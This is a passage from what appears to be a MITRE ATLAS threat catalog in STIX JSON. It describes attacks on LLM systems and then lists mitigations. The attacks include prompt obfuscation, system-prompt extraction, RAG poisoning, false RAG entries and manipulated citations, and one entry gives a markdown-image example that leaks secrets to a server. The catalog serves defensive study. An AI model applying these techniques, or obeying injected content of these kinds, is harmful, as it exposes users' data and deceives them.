mechanisms common in RAG systems (see [RAG Poisoning](/techniques/AML.T0070)).\n\nLarge language models may be used as an assistant to aid an adversary in crafting content.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0066", "external_id": "AML.T0066"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--508d3e8b-1457-4b04-8685-be14dd421cf9", "created": "2025-08-12T19:58:34.755272Z", "modified": "2025-08-12T19:58:34.755272Z", "name": "LLM Trusted Output Components Manipulation", "description": "Adversaries may utilize prompts to a large language model (LLM) which manipulate various components of its response in order to make it appear trustworthy to the user. This helps the adversary continue to operate in the victim's environment and evade detection by the users it interacts with.\n\nThe LLM may be instructed to tailor its language to appear more trustworthy to the user or attempt to manipulate the user to take certain actions. Other response components that could be manipulated include links, recommended follow-up actions, retrieved document metadata, and [Citations](/techniques/AML.T0067.000).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0067", "external_id": "AML.T0067"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--07f9e660-1a1f-4e2a-935c-c511e7d2d304", "created": "2025-08-12T19:58:34.755357Z", "modified": "2025-08-12T19:58:34.755357Z", "name": "LLM Prompt Obfuscation", "description": "Adversaries may hide or otherwise obfuscate prompt injections or retrieval content from the user to avoid detection.\n\nThis may include modifying how the injection is rendered such as small text, text colored the same as the background, or hidden HTML elements.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0068", "external_id": "AML.T0068"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--89a68366-0bd4-4344-b30b-2b859d2d1d54", "created": "2025-08-12T19:58:34.755442Z", "modified": "2025-08-12T19:58:34.755442Z", "name": "Discover LLM System Information", "description": "The adversary is trying to discover something about the large language model's (LLM) system information. This may be found in a configuration file containing the system instructions or extracted via interactions with the LLM. The desired information may include the full system prompt, special characters that have significance to the LLM or keywords indicating functionality available to the LLM. Information about how the LLM is instructed can be used by the adversary to understand the system's capabilities and to aid them in crafting malicious prompts.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0069", "external_id": "AML.T0069"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--02c6a7e0-475a-4752-bb53-c375700138c8", "created": "2025-08-12T19:58:34.755515Z", "modified": "2025-08-12T19:58:34.755515Z", "name": "Special Character Sets", "description": "Adversaries may discover delimiters and special characters sets used by the large language model. For example, delimiters used in retrieval augmented generation applications to differentiate between context and user prompts. These can later be exploited to confuse or manipulate the large language model into misbehaving.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0069.000", "external_id": "AML.T0069.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--ea86c03d-6509-4bcb-a0dc-61f02309dc4f", "created": "2025-08-12T19:58:34.755652Z", "modified": "2025-08-12T19:58:34.755652Z", "name": "System Instruction Keywords", "description": "Adversaries may discover keywords that have special meaning to the large language model (LLM), such as function names or object names. These can later be exploited to confuse or manipulate the LLM into misbehaving and to make calls to plugins the LLM has access to.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0069.001", "external_id": "AML.T0069.001"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--8b85fd7f-77fe-46ab-8842-964a9cca4bd8", "created": "2025-08-12T19:58:34.755792Z", "modified": "2025-08-12T19:58:34.755792Z", "name": "System Prompt", "description": "Adversaries may discover a large language model's system instructions provided by the AI system builder to learn about the system's capabilities and circumvent its guardrails.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0069.002", "external_id": "AML.T0069.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--cd22548c-eb05-499a-a267-19c283d38c99", "created": "2025-08-12T19:58:34.755941Z", "modified": "2025-08-12T19:58:34.755941Z", "name": "RAG Poisoning", "description": "Adversaries may inject malicious content into data indexed by a retrieval augmented generation (RAG) system to contaminate a future thread through RAG-based search results. This may be accomplished by placing manipulated documents in a location the RAG indexes (see [Gather RAG-Indexed Targets](/techniques/AML.T0064)).\n\nThe content may be targeted such that it would always surface as a search result for a specific user query. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions, or false RAG entries.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "persistence"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0070", "external_id": "AML.T0070"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--18a1f52d-8e32-4e76-831d-f590c4b98196", "created": "2025-08-12T19:58:34.756029Z", "modified": "2025-08-12T19:58:34.756029Z", "name": "False RAG Entry Injection", "description": "Adversaries may introduce false entries into a victim's retrieval augmented generation (RAG) database. Content designed to be interpreted as a document by the large language model (LLM) used in the RAG system is included in a data source being ingested into the RAG database. When RAG entry including the false document is retrieved the, the LLM is tricked into treating part of the retrieved content as a false RAG result. \n\nBy including a false RAG document inside of a regular RAG entry, it bypasses data monitoring tools. It also prevents the document from being deleted directly. \n\nThe adversary may use discovered system keywords to learn how to instruct a particular LLM to treat content as a RAG entry. They may be able to manipulate the injected entry's metadata including document title, author, and creation date.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0071", "external_id": "AML.T0071"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--7173dc23-7ce1-4d38-a6fa-15f6aa8e76c4", "created": "2025-08-12T19:58:34.756104Z", "modified": "2025-08-12T19:58:34.756104Z", "name": "Citations", "description": "Adversaries may manipulate the citations provided in an AI system's response, in order to make it appear trustworthy. Variants include citing a providing the wrong citation, making up a new citation, or providing the right citation but for adversary-provided data.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0067.000", "external_id": "AML.T0067.000"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--e0e50373-4d78-4630-860c-8188fc3eefcb", "created": "2025-08-12T19:58:34.756241Z", "modified": "2025-08-12T19:58:34.756241Z", "name": "Embed Malware", "description": "Adversaries may embed malicious code into AI Model files.\nAI models may be packaged as a combination of instructions and weights.\nSome formats such as pickle files are unsafe to deserialize because they can contain unsafe calls such as exec.\nModels with embedded malware may still operate as expected.\nIt may allow them to achieve Execution, Command & Control, or Exfiltrate Data.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0018.002", "external_id": "AML.T0018.002"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--47eecd80-97f8-4877-8f0d-549253f4e432", "created": "2025-08-12T19:58:34.756379Z", "modified": "2025-08-12T19:58:34.756379Z", "name": "Container Registry", "description": "An adversary may compromise a victim's container registry by pushing a manipulated container image and overwriting an existing container name and/or tag. Users of the container registry as well as automated CI/CD pipelines may pull the adversary's container image, compromising their AI Supply Chain. This can affect development and deployment environments.\n\nContainer images may include AI models, so the compromised image could have an AI model which was manipulated by the adversary (See [Manipulate AI Model](/techniques/AML.T0018)).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0010.004", "external_id": "AML.T0010.004"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--82cc67bf-b217-4a52-8360-1d4ed2bb8793", "created": "2025-08-12T19:58:34.756524Z", "modified": "2025-08-12T19:58:34.756524Z", "name": "Reverse Shell", "description": "Adversaries may utilize a reverse shell to communicate and control the victim system.\n\nTypically, a user uses a client to connect to a remote machine which is listening for connections. With a reverse shell, the adversary is listening for incoming connections initiated from the victim system.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "command-and-control"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0072", "external_id": "AML.T0072"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--2d20164c-a7b1-4838-89aa-f6db43d5abe3", "created": "2025-08-12T19:58:34.75661Z", "modified": "2025-08-12T19:58:34.75661Z", "name": "Impersonation", "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing](/techniques/AML.T0052), or [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary's ultimate goals, possibly against multiple victims.\n\nAdversaries may target resources that are part of the AI DevOps lifecycle, such as model repositories, container registries, and software registries.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0073", "external_id": "AML.T0073"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--74c298b9-adf8-43eb-84d7-f7c1928b8883", "created": "2025-08-12T19:58:34.756695Z", "modified": "2025-08-12T19:58:34.756695Z", "name": "Masquerading", "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0074", "external_id": "AML.T0074"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--a4bea531-f60f-463b-8e69-aafb951ec916", "created": "2025-08-12T19:58:34.75678Z", "modified": "2025-08-12T19:58:34.75678Z", "name": "Cloud Service Discovery", "description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.[1][2]\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.[3][4]\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable or Modify Cloud Logs.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "discovery"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0075", "external_id": "AML.T0075"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--4474e2c7-ef58-4adf-8d2d-8ce55deedec5", "created": "2025-08-12T19:58:34.756862Z", "modified": "2025-08-12T19:58:34.756862Z", "name": "Corrupt AI Model", "description": "An adversary may purposefully corrupt a malicious AI model file so that it cannot be successfully deserialized in order to evade detection by a model scanner. The corrupt model may still successfully execute malicious code before deserialization fails.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "defense-evasion"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0076", "external_id": "AML.T0076"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--5d35bff4-a8f5-453f-b3a1-2413336739ad", "created": "2025-08-12T19:58:34.756949Z", "modified": "2025-08-12T19:58:34.756949Z", "name": "LLM Response Rendering", "description": "An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images which automatically make a request to an adversary controlled server, or clickable links which require user interaction.\n\nFor example, an LLM may produce the following markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=private_data)\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=private_data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "exfiltration"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0077", "external_id": "AML.T0077"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--b2954419-50fe-4919-b69d-cb6aca2e553e", "created": "2025-08-12T19:58:34.757022Z", "modified": "2025-08-12T19:58:34.757022Z", "name": "Serverless", "description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to proxy traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers. This can be used to bypass a Content Security Policy that prevents retrieving content from arbitrary locations.", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "exfiltration"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0008.004", "external_id": "AML.T0008.004"}], "x_mitre_is_subtechnique": true, "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--f54c0789-e3a1-4683-bfff-90fd237034b6", "created": "2025-08-12T19:58:34.757173Z", "modified": "2025-08-12T19:58:34.757173Z", "name": "Drive-by Compromise", "description": "Adversaries may gain access to an AI system through a user visiting a website over the normal course of browsing, or an AI agent retrieving information from the web on behalf of a user. Websites can contain an [LLM Prompt Injection](/techniques/AML.T0051) which, when executed, can change the behavior of the AI model.\n\nThe same approach may be used to deliver other types of malicious code that don't target AI directly (see [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "initial-access"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0078", "external_id": "AML.T0078"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "attack-pattern", "spec_version": "2.1", "id": "attack-pattern--77c877fb-3dde-4051-a565-1ad93868090b", "created": "2025-08-12T19:58:34.757261Z", "modified": "2025-08-12T19:58:34.757261Z", "name": "Stage Capabilities", "description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](/techniques/AML.T0017)) or obtained ([Obtain Capabilities](/techniques/AML.T0016)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](/techniques/AML.T0008)) or was otherwise compromised by them. Capabilities may also be staged on web services, such as GitHub, model registries, such as Hugging Face, or container registries.\n\nAdversaries may stage a variety of AI Artifacts including poisoned datasets ([Publish Poisoned Datasets](/techniques/AML.T0019), malicious models ([Publish Poisoned Models](/techniques/AML.T0058)), and prompt injections. They may target names of legitimate companies or products, engage in typosquatting, or use hallucinated entities ([Discover LLM Hallucinations](/techniques/AML.T0062)).", "kill_chain_phases": [{"kill_chain_name": "mitre-atlas", "phase_name": "resource-development"}], "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/techniques/AML.T0079", "external_id": "AML.T0079"}], "x_mitre_platforms": ["ATLAS"]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--9c18d1cf-cf39-49e6-a60c-bd0cd34e381c", "created": "2025-08-12T19:58:34.758502Z", "modified": "2025-08-12T19:58:34.758502Z", "name": "Limit Public Release of Information", "description": "Limit the public release of technical information about the AI stack used in an organization's products or services. Technical knowledge of how AI is used can be leveraged by adversaries to perform targeting and tailor attacks to the target system. Additionally, consider limiting the release of organizational information - including physical locations, researcher names, and department structures - from which technical details such as AI techniques, model architectures, or datasets may be inferred.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0000", "external_id": "AML.M0000"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--d40b9028-ea1d-477b-95e4-b875ecefb72e", "created": "2025-08-12T19:58:34.75885Z", "modified": "2025-08-12T19:58:34.75885Z", "name": "Limit Model Artifact Release", "description": "Limit public release of technical project details including data, algorithms, model architectures, and model checkpoints that are used in production, or that are representative of those used in production.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0001", "external_id": "AML.M0001"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--517ba232-61b8-42f4-a609-ef487befcba6", "created": "2025-08-12T19:58:34.759128Z", "modified": "2025-08-12T19:58:34.759128Z", "name": "Passive AI Output Obfuscation", "description": "Decreasing the fidelity of model outputs provided to the end user can reduce an adversaries ability to extract information about the model and optimize attacks for the model.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0002", "external_id": "AML.M0002"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--70fa8e8c-dd1f-480b-b077-49b3a8a368e4", "created": "2025-08-12T19:58:34.759717Z", "modified": "2025-08-12T19:58:34.759717Z", "name": "Model Hardening", "description": "Use techniques to make AI models robust to adversarial inputs such as adversarial training or network distillation.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0003", "external_id": "AML.M0003"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "created": "2025-08-12T19:58:34.759944Z", "modified": "2025-08-12T19:58:34.759944Z", "name": "Restrict Number of AI Model Queries", "description": "Limit the total number and rate of queries a user can perform.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0004", "external_id": "AML.M0004"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--e1cc319e-11c3-4492-859e-31fafdb015b9", "created": "2025-08-12T19:58:34.760716Z", "modified": "2025-08-12T19:58:34.760716Z", "name": "Control Access to AI Models and Data at Rest", "description": "Establish access controls on internal model registries and limit internal access to production models. Limit access to training data only to approved users.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0005", "external_id": "AML.M0005"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--f8eafc3b-e449-43e5-8a77-ced965d047d2", "created": "2025-08-12T19:58:34.761264Z", "modified": "2025-08-12T19:58:34.761264Z", "name": "Use Ensemble Methods", "description": "Use an ensemble of models for inference to increase robustness to adversarial inputs. Some attacks may effectively evade one model or model family but be ineffective against others.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0006", "external_id": "AML.M0006"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--93413c78-9844-4807-82fc-805b991f13a0", "created": "2025-08-12T19:58:34.761667Z", "modified": "2025-08-12T19:58:34.761667Z", "name": "Sanitize Training Data", "description": "Detect and remove or remediate poisoned training data.  Training data should be sanitized prior to model training and recurrently for an active learning model.\n\nImplement a filter to limit ingested training data.  Establish a content policy that would remove unwanted content such as certain explicit or offensive language from being used.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0007", "external_id": "AML.M0007"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--74a50fce-ef6e-4575-8535-5c0c07415d0b", "created": "2025-08-12T19:58:34.762096Z", "modified": "2025-08-12T19:58:34.762096Z", "name": "Validate AI Model", "description": "Validate that AI models perform as intended by testing for backdoor triggers or adversarial influence.\nMonitor model for concept drift and training data drift, which may indicate data tampering and poisoning.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0008", "external_id": "AML.M0008"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--bf7a7cc1-18bc-4e40-9524-40e582edee1e", "created": "2025-08-12T19:58:34.76242Z", "modified": "2025-08-12T19:58:34.76242Z", "name": "Use Multi-Modal Sensors", "description": "Incorporate multiple sensors to integrate varying perspectives and modalities to avoid a single point of failure susceptible to physical attacks.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0009", "external_id": "AML.M0009"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--618a733d-5483-40b5-a806-c8193c5e88bc", "created": "2025-08-12T19:58:34.762646Z", "modified": "2025-08-12T19:58:34.762646Z", "name": "Input Restoration", "description": "Preprocess all inference data to nullify or reverse potential adversarial perturbations.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0010", "external_id": "AML.M0010"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--12d79dac-1d29-4988-ab18-013654b9e1cf", "created": "2025-08-12T19:58:34.762958Z", "modified": "2025-08-12T19:58:34.762958Z", "name": "Restrict Library Loading", "description": "Prevent abuse of library loading mechanisms in the operating system and software to load untrusted code by configuring appropriate library loading mechanisms and investigating potential vulnerable software.\n\nFile formats such as pickle files that are commonly used to store AI models can contain exploits that allow for loading of malicious libraries.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0011", "external_id": "AML.M0011"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--5bc32c96-9f7e-4fbe-b209-9129cc94e598", "created": "2025-08-12T19:58:34.763182Z", "modified": "2025-08-12T19:58:34.763182Z", "name": "Encrypt Sensitive Information", "description": "Encrypt sensitive data such as AI models to protect against adversaries attempting to access sensitive data.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0012", "external_id": "AML.M0012"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--e1c12848-fd8f-4270-a550-4b0595b16546", "created": "2025-08-12T19:58:34.763505Z", "modified": "2025-08-12T19:58:34.763505Z", "name": "Code Signing", "description": "Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing. Adversaries can embed malicious code in AI software or models. Enforcement of code signing can prevent the compromise of the AI supply chain and prevent execution of malicious code.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0013", "external_id": "AML.M0013"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--8ed6c38c-4715-4764-bf91-2ecb4c0f6ec4", "created": "2025-08-12T19:58:34.763797Z", "modified": "2025-08-12T19:58:34.763797Z", "name": "Verify AI Artifacts", "description": "Verify the cryptographic checksum of all AI artifacts to verify that the file was not modified by an attacker.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0014", "external_id": "AML.M0014"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--2e012240-4892-4f29-b077-a5e47840f8bc", "created": "2025-08-12T19:58:34.764079Z", "modified": "2025-08-12T19:58:34.764079Z", "name": "Adversarial Input Detection", "description": "Detect and block adversarial inputs or atypical queries that deviate from known benign behavior, exhibit behavior patterns observed in previous attacks or that come from potentially malicious IPs.\nIncorporate adversarial detection algorithms into the AI system prior to the AI model.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0015", "external_id": "AML.M0015"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--e12c9cc1-de46-4b0c-8204-c9dc67ca8a39", "created": "2025-08-12T19:58:34.764451Z", "modified": "2025-08-12T19:58:34.764451Z", "name": "Vulnerability Scanning", "description": "Vulnerability scanning is used to find potentially exploitable software vulnerabilities to remediate them.\n\nFile formats such as pickle files that are commonly used to store AI models can contain exploits that allow for arbitrary code execution.\nThese files should be scanned for potentially unsafe calls, which could be used to execute code, create new processes, or establish networking capabilities.\nAdversaries may embed malicious code in model corrupt model files, so scanners should be capable of working with models that cannot be fully de-serialized.\nBoth model artifacts and downstream products produced by models should be scanned for known vulnerabilities.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0016", "external_id": "AML.M0016"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--4601ffbb-044c-4964-9643-c09eb4cd2263", "created": "2025-08-12T19:58:34.764599Z", "modified": "2025-08-12T19:58:34.764599Z", "name": "AI Model Distribution Methods", "description": "Deploying AI models to edge devices can increase the attack surface of the system.\nConsider serving models in the cloud to reduce the level of access the adversary has to the model.\nAlso consider computing features in the cloud to prevent gray-box attacks, where an adversary has access to the model preprocessing methods.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0017", "external_id": "AML.M0017"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--acac05f4-091b-4f75-92b1-8c9cc5673601", "created": "2025-08-12T19:58:34.764896Z", "modified": "2025-08-12T19:58:34.764896Z", "name": "User Training", "description": "Educate AI model developers on secure coding practices and AI vulnerabilities.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0018", "external_id": "AML.M0018"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--10c73291-d9ac-45cd-be74-5efde9361756", "created": "2025-08-12T19:58:34.765213Z", "modified": "2025-08-12T19:58:34.765213Z", "name": "Control Access to AI Models and Data in Production", "description": "Require users to verify their identities before accessing a production model.\nRequire authentication for API endpoints and monitor production model queries to ensure compliance with usage policies and to prevent model misuse.\n", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0019", "external_id": "AML.M0019"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--d0c7e3fb-b78a-460e-87da-2b5344e00645", "created": "2025-08-12T19:58:34.765466Z", "modified": "2025-08-12T19:58:34.765466Z", "name": "Generative AI Guardrails", "description": "Guardrails are safety controls that are placed between a generative AI model and the output shared with the user to prevent undesired inputs and outputs.\nGuardrails can take the form of validators such as filters, rule-based logic, or regular expressions, as well as AI-based approaches, such as classifiers and utilizing LLMs, or named entity recognition (NER) to evaluate the safety of the prompt or response. Domain specific methods can be employed to reduce risks in a variety of areas such as etiquette, brand damage, jailbreaking, false information, code exploits, SQL injections, and data leakage.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0020", "external_id": "AML.M0020"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--e6e183f9-97e2-4699-80e7-963a72b12c7c", "created": "2025-08-12T19:58:34.766147Z", "modified": "2025-08-12T19:58:34.766147Z", "name": "Generative AI Guidelines", "description": "Guidelines are safety controls that are placed between user-provided input and a generative AI model to help direct the model to produce desired outputs and prevent undesired outputs.\n\nGuidelines can be implemented as instructions appended to all user prompts or as part of the instructions in the system prompt. They can define the goal(s), role, and voice of the system, as well as outline safety and security parameters.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0021", "external_id": "AML.M0021"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--55363f1c-b02d-4c28-829a-d8e07c2bf982", "created": "2025-08-12T19:58:34.76663Z", "modified": "2025-08-12T19:58:34.76663Z", "name": "Generative AI Model Alignment", "description": "When training or fine-tuning a generative AI model it is important to utilize techniques that improve model alignment with safety, security, and content policies.\n\nThe fine-tuning process can potentially remove built-in safety mechanisms in a generative AI model, but utilizing techniques such as Supervised Fine-Tuning, Reinforcement Learning from Human Feedback or AI Feedback, and Targeted Safety Context Distillation can improve the safety and alignment of the 